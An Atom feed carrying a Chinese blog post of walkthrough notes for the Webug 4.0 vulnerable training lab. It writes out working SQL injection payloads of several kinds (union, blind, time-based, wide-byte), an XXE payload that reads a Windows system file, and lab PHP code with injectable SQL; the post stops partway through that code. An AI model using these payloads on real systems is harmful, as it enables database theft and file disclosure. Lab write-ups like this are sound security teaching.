<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hyacinthの博客</title>
  
  <subtitle>记录点滴日常</subtitle>
  <link href="https://speedpromise.github.io/atom.xml" rel="self"/>
  
  <link href="https://speedpromise.github.io/"/>
  <updated>2022-03-23T13:02:02.177Z</updated>
  <id>https://speedpromise.github.io/</id>
  
  <author>
    <name>Hyacinth</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Webug 4.0 笔记</title>
    <link href="https://speedpromise.github.io/archives/9679350.html"/>
    <id>https://speedpromise.github.io/archives/9679350.html</id>
    <published>2022-03-12T03:50:24.000Z</published>
    <updated>2022-03-23T13:02:02.177Z</updated>
    
    <content type="html"><![CDATA[<p>Webug </p><span id="more"></span><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h3><p>注入点<br><code>control/sqlinject/manifest_error.php?id=1</code></p><p>判断注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 1&#39; and 1&#x3D;1--+</span><br><span class="line">control&#x2F;sqlinject&#x2F;manifest_error.php?id&#x3D;1&#39; and 1&#x3D;1--+</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/18/utUrZWovf6dJlE4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 1&#39; and 1&#x3D;2--+</span><br><span class="line">control&#x2F;sqlinject&#x2F;manifest_error.php?id&#x3D;1&#39; and 1&#x3D;2--+</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/18/qW5ZvACV7YmFlz1.png"></p><p>页面元素发生变化，注入存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 判断字段数量，测试出数量为 2</span><br><span class="line">1&#39; order by 2--+</span><br><span class="line"> </span><br><span class="line"># 显位</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,2--+</span><br><span class="line">&gt;&gt; 2</span><br><span class="line"></span><br><span class="line"># 查看当前库下的所有表</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br><span class="line">&gt;&gt; data_crud,env_list,env_path,flag,sqlinjection,user,user_test</span><br><span class="line">  </span><br><span class="line"># 查看 flag 表所有字段</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;--+</span><br><span class="line">&gt;&gt; id,flag</span><br><span class="line"></span><br><span class="line"># 查看 flag 内容</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1, group_concat(flag) from flag--+</span><br><span class="line">&gt;&gt; dfafdasfafdsadfa</span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 返回正常</span><br><span class="line">1&#39; and 1&#x3D;1--+</span><br><span class="line"># 返回异常</span><br><span class="line">1&#39; and 1&#x3D;2--+</span><br><span class="line">------------------------------------</span><br><span class="line"># 判断数据库长度</span><br><span class="line">1&#39; and length(database())&#x3D;5--+</span><br><span class="line">&gt;&gt; 5</span><br><span class="line"></span><br><span class="line"># 爆破数据库名字</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&#x3D;119--+</span><br><span class="line">... BurpSuite Clusterbomb</span><br><span class="line">&gt;&gt; 119 101 98 117 103, webug</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/18/jaL4AT7cvyPMfR9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 判断数据库表数量</span><br><span class="line">1&#39; and (select count(*) from information_schema.tables where table_schema&#x3D;database())&#x3D;7--+</span><br><span class="line">&gt;&gt; 7</span><br><span class="line"></span><br><span class="line"># 判断数据库各表的表名长度</span><br><span class="line">1&#39; and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;9--+</span><br><span class="line">... BurpSuite Clusterbomb</span><br><span class="line">&gt;&gt; 9 8 8 4 12 4 9</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/18/pJMT3zsBv4RmIb9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"># 爆破第二张表表名</span><br><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&#x3D;101--+</span><br><span class="line">...</span><br><span class="line">&gt;&gt; 101 110 118 95 108 105 115 116, env_list</span><br><span class="line"></span><br><span class="line"># 爆破 env_list 字段数量</span><br><span class="line">1&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;env_list&#39;)&#x3D;8--+</span><br><span class="line"># 爆破 env_list 各字段长度</span><br><span class="line">1&#39; and (select length(column_name) from information_schema.columns where table_name&#x3D;&#39;env_list&#39; limit 0,1)&#x3D;2--+</span><br><span class="line">...</span><br><span class="line"># 爆破 env_list 第五个字段名</span><br><span class="line">1&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;env_list&#39; limit 5,1),1,1))&#x3D;101--+</span><br><span class="line">...</span><br><span class="line">&gt;&gt; 101 110 118 70 108 97 103, envFlag</span><br><span class="line"></span><br><span class="line"># 爆破 envFlag 记录条数</span><br><span class="line"># 爆破 envFlag 各记录字符数</span><br><span class="line"># 爆破 envFlag 各记录字符</span><br><span class="line">...</span><br><span class="line">&gt;&gt; fdsafsdfa</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入语句与盲注语句类似，不过是多了一个 if 语句判断，正确或不正确都会返回相对应的响应时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 出现延迟，存在注入 </span><br><span class="line">1&#39; and sleep(5)--+</span><br><span class="line"></span><br><span class="line"># 判断数据库字符长度</span><br><span class="line">1&#39; and if(length(database()&#x3D;5), sleep(3), 1)--+</span><br><span class="line"></span><br><span class="line"># 爆破数据库名</span><br><span class="line">1&#39; and if(ascii(substr(database(),1,1))&#x3D;119,sleep(3),1)--+</span><br><span class="line">1&#39; and if(ascii(substr(database(),2,1))&#x3D;101,sleep(3),1)--+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># 判断数据库表数量</span><br><span class="line">1&#39; and if((select count(*) from information_schema.tables where table_schema&#x3D;database())&#x3D;7,sleep(3),1)--+</span><br><span class="line"></span><br><span class="line"># 判断数据库各表的表名长度</span><br><span class="line">1&#39; and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;9,sleep(3),1)--+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"># 爆破第二张表表名</span><br><span class="line">1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&#x3D;101,sleep(3),1)--+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># 爆破 env_list 字段数量</span><br><span class="line">1&#39; and if((select count(column_name) from information_schema.columns where table_name&#x3D;&#39;env_list&#39;)&#x3D;8,sleep(3),1)--+</span><br><span class="line"># 爆破 env_list 各字段长度</span><br><span class="line">1&#39; and if((select length(column_name) from information_schema.columns where table_name&#x3D;&#39;env_list&#39; limit 0,1)&#x3D;2,sleep(3),1)--+</span><br><span class="line">...</span><br><span class="line"># 爆破 env_list 第五个字段名</span><br><span class="line">1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;env_list&#39; limit 5,1),1,1))&#x3D;101,sleep(3),1)--+</span><br><span class="line">...</span><br><span class="line"># 爆破 envFlag 记录条数</span><br><span class="line"># 爆破 envFlag 各记录字符数</span><br><span class="line"># 爆破 envFlag 各记录字符</span><br><span class="line">...</span><br><span class="line">&gt;&gt; gfdgdfsdg</span><br></pre></td></tr></table></figure><h3 id="post-注入"><a href="#post-注入" class="headerlink" title="post 注入"></a>post 注入</h3><p>注入点：</p><p><img data-src="https://s2.loli.net/2022/02/21/VXpAJ6USQD3reqj.jpg"></p><p>报错：<code>Invalid query: SELECT * FROM sqlinjection WHERE content = &#39;1&#39;&#39;</code></p><p><img data-src="https://s2.loli.net/2022/02/21/vAjqoUSmha81G2z.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 出现延时</span><br><span class="line">keyWordName&#x3D;1&#39; or sleep(5)--+</span><br></pre></td></tr></table></figure><p>剩下操作和上关类似，将 and 改成 or 即可。</p><h3 id="过滤注入"><a href="#过滤注入" class="headerlink" title="过滤注入"></a>过滤注入</h3><p>同上，并没有过滤。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 报错</span><br><span class="line">1%df%27</span><br><span class="line"></span><br><span class="line"># 正常显示</span><br><span class="line">1%df%27--+</span><br><span class="line"></span><br><span class="line"># 查看当前字段数</span><br><span class="line">1%df%27 order by 2--+</span><br><span class="line">&gt;&gt; 2</span><br><span class="line"></span><br><span class="line"># 显位</span><br><span class="line">1%df%27 and 1&#x3D;2 union select 1,2--+</span><br><span class="line">&gt;&gt; 2</span><br><span class="line"></span><br><span class="line"># 查看 webug 数据库下所有表</span><br><span class="line">1%df%27 and 1&#x3D;2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7765627567--+</span><br><span class="line">&gt;&gt; data_crud,env_list,env_path,flag,sqlinjection,user,user_test</span><br><span class="line"></span><br><span class="line"># 查看 env_list 表下所有字段</span><br><span class="line">1%df%27 and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x656e765f6c697374--+</span><br><span class="line">&gt;&gt; id,envName,envDesc,envIntegration,delFlag,envFlag,level,type</span><br><span class="line"></span><br><span class="line"># 查看 flag</span><br><span class="line">1%df%27 and 1&#x3D;2 union select 1,envFlag from webug.env_list limit 5,1--+</span><br><span class="line">&gt;&gt; dfsadfsadfas</span><br></pre></td></tr></table></figure><h3 id="xxe-注入"><a href="#xxe-注入" class="headerlink" title="xxe 注入"></a>xxe 注入</h3><p>页面只有一个用户名输入口，输入一个 admin 测试，未发现异常，既然题目表明是 xxe，直接输入 xml 数据传过去</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">helo</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">batch</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">test</span>&gt;</span>xxe test<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">batch</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">helo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/21/7dTGRKZY6skVLvh.png"></p><p>发现我们输入的内容会被显示出来，说明 xml 代码可以被网站解析执行。</p><p>本题没有 flag，但可以用下面的 payload 对系统文件进行读取：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">read</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>使用 burp 将上述代码编码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">3</span>c%<span class="number">3</span>f%<span class="number">78</span>%<span class="number">6</span>d%<span class="number">6</span>c%<span class="number">20</span>%<span class="number">76</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">73</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">3</span>d%<span class="number">22</span>%<span class="number">31</span>%<span class="number">2</span>e%<span class="number">30</span>%<span class="number">22</span>%<span class="number">3</span>f%<span class="number">3</span>e%<span class="number">0</span>a%<span class="number">3</span>c%<span class="number">21</span>%<span class="number">44</span>%<span class="number">4</span>f%<span class="number">43</span>%<span class="number">54</span>%<span class="number">59</span>%<span class="number">50</span>%<span class="number">45</span>%<span class="number">20</span>%<span class="number">41</span>%<span class="number">4</span>e%<span class="number">59</span>%<span class="number">20</span>%<span class="number">5</span>b%<span class="number">0</span>a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">3</span>c%<span class="number">21</span>%<span class="number">45</span>%<span class="number">4</span>e%<span class="number">54</span>%<span class="number">49</span>%<span class="number">54</span>%<span class="number">59</span>%<span class="number">20</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">20</span>%<span class="number">53</span>%<span class="number">59</span>%<span class="number">53</span>%<span class="number">54</span>%<span class="number">45</span>%<span class="number">4</span>d%<span class="number">20</span>%<span class="number">22</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">63</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">77</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">6</span>f%<span class="number">77</span>%<span class="number">73</span>%<span class="number">2</span>f%<span class="number">77</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>e%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">69</span>%<span class="number">22</span>%<span class="number">3</span>e%<span class="number">0</span>a%<span class="number">5</span>d%<span class="number">3</span>e%<span class="number">0</span>a%<span class="number">3</span>c%<span class="number">6</span>e%<span class="number">6</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">3</span>e%<span class="number">0</span>a%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">20</span>%<span class="number">3</span>c%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">3</span>e%<span class="number">26</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">3</span>b%<span class="number">3</span>c%<span class="number">2</span>f%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">3</span>e%<span class="number">0</span>a%<span class="number">3</span>c%<span class="number">2</span>f%<span class="number">6</span>e%<span class="number">6</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">3</span>e%<span class="number">20</span>%<span class="number">20</span></span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/21/MNHb23PfIj5GsQD.png"></p><p>可以看到获取到了系统文件内容。</p><h3 id="csv-注入"><a href="#csv-注入" class="headerlink" title="csv 注入"></a>csv 注入</h3><p>源文件有错误，数据库密码错误，且修改后仍无法导出，将代码改动如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;webug&#39;);</span><br><span class="line">if ($conn) &#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from data_crud&quot;;</span><br><span class="line">        $res &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">if (isset($_POST[&#39;daochu&#39;]))&#123;</span><br><span class="line">$headerArray &#x3D; [&#39;name&#39;,&#39;age&#39;,&#39;email&#39;];</span><br><span class="line">$string &#x3D; implode(&quot;,&quot;,$headerArray).&quot;\n&quot;;&#x2F;&#x2F;先做出表头</span><br><span class="line">while (list($id, $name, $age, $email, $deflag) &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">$data &#x3D; [[&#39;name&#39;&#x3D;&gt;urldecode($name),&#39;age&#39;&#x3D;&gt;urldecode($age),&#39;email&#39;&#x3D;&gt;urldecode($email)]</span><br><span class="line">];</span><br><span class="line">foreach ($data as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">&#x2F;&#x2F;把需要的字段一一对应起来，如果已经对应好 直接 $outArray &#x3D; $value;</span><br><span class="line">$outArray[&#39;name&#39;] &#x3D; $value[&#39;name&#39;];</span><br><span class="line">$outArray[&#39;age&#39;] &#x3D; $value[&#39;age&#39;];</span><br><span class="line">$outArray[&#39;email&#39;] &#x3D; $value[&#39;email&#39;];</span><br><span class="line">$string .&#x3D; implode(&quot;,&quot;,$outArray).&quot;\n&quot;; &#x2F;&#x2F;用英文逗号分开 </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">@$filename &#x3D; date(&#39;Ymd&#39;).&#39;.csv&#39;; &#x2F;&#x2F;设置文件名</span><br><span class="line">header(&quot;Content-type:text&#x2F;csv&quot;);</span><br><span class="line">header(&quot;Content-Disposition:attachment;filename&#x3D;&quot;.$filename);</span><br><span class="line">header(&#39;Cache-Control:must-revalidate,post-check&#x3D;0,pre-check&#x3D;0&#39;);</span><br><span class="line">header(&#39;Expires:0&#39;);</span><br><span class="line">header(&#39;Pragma:public&#39;);</span><br><span class="line">exit(mb_convert_encoding($string, &quot;GBK&quot;, &quot;UTF-8&quot;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;..&#x2F;..&#x2F;common&#x2F;common.php&quot;;</span><br><span class="line">if (!isset($_SESSION[&#39;user&#39;])) &#123;</span><br><span class="line">    header(&quot;Location:..&#x2F;login.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body&#123;font-family: Arial, Helvetica, sans-serif;&#125;</span><br><span class="line">    table&#123;border-collapse: collapse;</span><br><span class="line">        width: 50%;</span><br><span class="line">        text-align: center;&#125;</span><br><span class="line">    td,th&#123;border:1px solid #ccc; padding: 2px 5px;&#125;</span><br><span class="line">    button&#123;padding: 5px;&#125;</span><br><span class="line">    div &#123;</span><br><span class="line">        line-height: 3;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;webug&#39;);</span><br><span class="line">$i_name &#x3D;  urlencode($_POST[name]);</span><br><span class="line">$i_age &#x3D;  urlencode($_POST[age]);</span><br><span class="line">$i_email &#x3D;  urlencode($_POST[email]);</span><br><span class="line">if ($conn) &#123;</span><br><span class="line">if ($i_name !&#x3D; null &amp;&amp; $i_age !&#x3D; null &amp;&amp; $i_email !&#x3D; null)&#123;</span><br><span class="line">$sql &#x3D; &quot;INSERT INTO data_crud(name,age,email) VALUES (&#39;$i_name&#39;,&#39;$i_age&#39;,&#39;$i_email&#39;)&quot;;</span><br><span class="line">$res &#x3D; $conn-&gt;query($sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    if ($conn) &#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from data_crud&quot;;</span><br><span class="line">        $res &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;table id&#x3D;&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;Name&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;Age&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;Email&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        if ($res) &#123;</span><br><span class="line">            while (list($id, $name, $age, $email, $deflag) &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                echo &#39;&lt;tr&gt;&#39;;</span><br><span class="line">                echo &#39;&lt;input type&#x3D;&quot;text&quot; hidden&#x3D;&quot;hidden&quot; name&#x3D;&quot;id[]&quot; value&#x3D;&quot;&#39;.$id.&#39;&quot;&gt;&#39;;</span><br><span class="line">                echo &#39;&lt;td&gt;&lt;div contenteditable&#x3D;&quot;true&quot;&gt;&#39;.urldecode($name).&#39;&lt;&#x2F;div&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">                echo &#39;&lt;td&gt;&lt;div contenteditable&#x3D;&quot;true&quot;&gt;&#39;.urldecode($age).&#39;&lt;&#x2F;div&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">                echo  &#39;&lt;td&gt;&lt;div contenteditable&#x3D;&quot;true&quot;&gt;&#39;.urldecode($email).&#39;&lt;&#x2F;div&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">                echo &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input name&#x3D;&quot;daochu&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;导出&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h2&gt;添加新用户信息&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;table id&#x3D;&quot;table&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;Name&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;Age&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;Email&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;input name&#x3D;&quot;name&quot; type&#x3D;&quot;text&quot; size&#x3D;&quot;20&quot;&#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name&#x3D;&quot;age&quot; type&#x3D;&quot;text&quot; size&#x3D;&quot;20&quot;&#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name&#x3D;&quot;email&quot; type&#x3D;&quot;text&quot; size&#x3D;&quot;20&quot;&#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span 